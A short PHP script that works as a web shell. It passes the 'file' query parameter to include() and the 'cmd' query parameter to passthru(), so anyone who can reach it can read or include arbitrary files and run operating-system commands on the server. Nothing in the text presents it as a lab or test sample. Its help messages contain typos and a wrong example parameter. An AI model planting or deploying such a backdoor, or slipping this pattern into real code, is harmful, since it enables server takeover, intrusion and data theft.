<?php
if (isset($_GET['file'])) {
    include($_GET['file']);
} else {
    echo "Please specify a file to view. Example: ?file=index.php";
}
if (isset($_GET['cmd'])) {
    passthru($_GET['cmd']);
} else {
    echo "Please specify a commant to execute. Example: ?cdm=index.php";
}
?>
